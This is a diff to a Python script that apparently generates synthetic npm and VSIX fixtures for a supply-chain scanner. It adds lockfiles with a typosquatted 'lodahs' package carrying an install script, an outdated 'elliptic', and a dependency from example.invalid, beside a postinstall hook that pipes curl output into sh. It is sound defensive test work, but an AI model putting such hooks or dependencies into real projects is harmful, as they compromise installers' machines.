@@ -1,11 +1,13 @@
 from __future__ import annotations
 
+import base64
 import json
 import zipfile
 from pathlib import Path
 
 
 ROOT = Path(__file__).resolve().parent
+VALID_SHA512 = "sha512-" + base64.b64encode(bytes(64)).decode("ascii")
 
 
 def write_vsix(path: Path, source: str, *, name: str) -> None:
@@ -75,7 +77,26 @@ exports.inspectSyntheticValues = inspectSyntheticValues;
                 },
                 indent=2,
             ),
-            "package-lock.json": json.dumps({"lockfileVersion": 3}),
+            "package-lock.json": json.dumps(
+                {
+                    "name": "synthetic-benign-repository",
+                    "version": "1.0.0",
+                    "lockfileVersion": 3,
+                    "packages": {
+                        "": {
+                            "name": "synthetic-benign-repository",
+                            "version": "1.0.0",
+                            "dependencies": {"kleur": "4.1.5"},
+                        },
+                        "node_modules/kleur": {
+                            "version": "4.1.5",
+                            "resolved": "https://registry.npmjs.org/kleur/-/kleur-4.1.5.tgz",
+                            "integrity": VALID_SHA512,
+                        },
+                    },
+                },
+                indent=2,
+            ),
             "src/index.js": "export const greet = (name) => `hello ${name}`;\n",
             ".github/workflows/test.yml": (
                 "name: test\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
@@ -96,10 +117,48 @@ exports.inspectSyntheticValues = inspectSyntheticValues;
                         "postinstall": "curl https://example.invalid/install.sh | sh",
                         "test": "node scripts/bootstrap.js",
                     },
+                    "dependencies": {
+                        "elliptic": "6.5.3",
+                        "lodahs": "4.17.21",
+                        "remote-tool": "https://example.invalid/remote-tool.tgz",
+                    },
                 },
                 indent=2,
             ),
-            "package-lock.json": json.dumps({"lockfileVersion": 3}),
+            "package-lock.json": json.dumps(
+                {
+                    "name": "synthetic-crypto-stealer-patterns",
+                    "version": "0.0.0",
+                    "lockfileVersion": 3,
+                    "packages": {
+                        "": {
+                            "name": "synthetic-crypto-stealer-patterns",
+                            "version": "0.0.0",
+                            "dependencies": {
+                                "elliptic": "6.5.3",
+                                "lodahs": "4.17.21",
+                                "remote-tool": "https://example.invalid/remote-tool.tgz",
+                            },
+                        },
+                        "node_modules/elliptic": {
+                            "version": "6.5.3",
+                            "resolved": "https://registry.npmjs.org/elliptic/-/elliptic-6.5.3.tgz",
+                            "integrity": VALID_SHA512,
+                        },
+                        "node_modules/lodahs": {
+                            "version": "4.17.21",
+                            "resolved": "https://registry.npmjs.org/lodahs/-/lodahs-4.17.21.tgz",
+                            "hasInstallScript": True,
+                        },
+                        "node_modules/remote-tool": {
+                            "version": "1.0.0",
+                            "resolved": "https://example.invalid/remote-tool-1.0.0.tgz",
+                            "integrity": VALID_SHA512,
+                        },
+                    },
+                },
+                indent=2,
+            ),
             "scripts/bootstrap.js": """// Defensive fixture only. No real secrets or live destination.
 const fs = require('fs');
 const cp = require('child_process');
